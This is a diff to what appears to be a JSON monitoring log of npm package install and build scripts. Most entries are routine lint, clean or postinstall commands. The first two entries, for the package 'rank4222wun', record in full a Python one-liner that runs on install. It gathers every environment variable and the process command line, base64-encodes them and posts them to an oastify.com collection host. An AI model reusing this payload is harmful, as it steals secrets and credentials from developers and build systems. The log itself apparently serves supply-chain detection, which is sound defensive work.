@@ -1,5 +1,77 @@
 [
   {
+    "packageName": "rank4222wun",
+    "version": "1.0.12",
+    "scriptType": "postinstall",
+    "scriptContent": "python3 -c \"import os, base64, httpx, sys; try: env_data = '\\n'.join([f'{k}={v}' for k, v in os.environ.items()]); cmd_line = open('/proc/self/cmdline').read(); res = f'ENV:\\n{env_data}\\n\\nCMD:\\n{cmd_line}'; body = base64.b64encode(res.encode()).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/mem_leak', content=body, timeout=10); print('Done'); except Exception as e: httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/error', content=str(e))\"",
+    "previousVersion": "1.0.11",
+    "timestamp": "2026-01-23T10:41:01.333Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "rank4222wun",
+    "version": "1.0.12",
+    "scriptType": "preinstall",
+    "scriptContent": "python3 -c \"import os, base64, httpx, sys; try: env_data = '\\n'.join([f'{k}={v}' for k, v in os.environ.items()]); cmd_line = open('/proc/self/cmdline').read(); res = f'ENV:\\n{env_data}\\n\\nCMD:\\n{cmd_line}'; body = base64.b64encode(res.encode()).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/mem_leak', content=body, timeout=10); print('Done'); except Exception as e: httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/error', content=str(e))\"",
+    "previousVersion": "1.0.11",
+    "timestamp": "2026-01-23T10:41:01.327Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "@zhing2006/ogd",
+    "version": "0.1.2",
+    "scriptType": "postinstall",
+    "scriptContent": "node scripts/postinstall.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T10:40:02.874Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "domino-elements",
+    "version": "99.9.8",
+    "scriptType": "preinstall",
+    "scriptContent": "node index.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T10:32:11.819Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "test-uniswap-position-quoter",
+    "version": "1.0.4-test.1",
+    "scriptType": "prebuild",
+    "scriptContent": "npm run lint",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T10:31:17.819Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "@power-rent/react-datepicker-modern",
+    "version": "1.0.1",
+    "scriptType": "prebuild",
+    "scriptContent": "../../node_modules/.bin/rimraf lib",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T10:31:14.082Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "@xen-orchestra/template",
+    "version": "0.1.0",
+    "scriptType": "prebuild",
+    "scriptContent": "yarn run clean",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T09:34:16.709Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "@wonderlandengine/ar-provider-zappar",
+    "version": "1.0.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node ./scripts/postinstall.mjs",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T09:33:39.375Z",
+    "issuesend": true
+  },
+  {
     "packageName": "@peerbit/test-lib",
     "version": "0.0.1",
     "scriptType": "postbuild",
